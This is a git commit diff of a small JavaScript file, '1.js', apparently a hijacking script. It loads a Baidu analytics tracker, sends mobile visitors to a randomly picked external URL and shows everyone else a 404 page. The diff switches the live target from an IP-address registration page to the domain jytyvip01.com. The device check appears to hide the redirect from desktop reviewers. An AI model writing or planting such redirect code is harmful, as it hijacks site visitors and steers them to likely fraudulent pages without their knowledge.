8761e1817c5effa4a74e2e6821e4e2fe0debb53e
dnshook <62766196+dnshook@users.noreply.github.com>
2024-04-20 20:29:56 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -6,8 +6,8 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	//var arr = ["http://jytyvip01.com", "http://jytyvip01.com"];
-	var arr = ["https://35.194.228.102:11573/register", "https://35.194.228.102:11573/register"];
+	var arr = ["http://jytyvip01.com", "http://jytyvip01.com"];
+	//var arr = ["https://35.194.228.102:11573/register", "https://35.194.228.102:11573/register"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
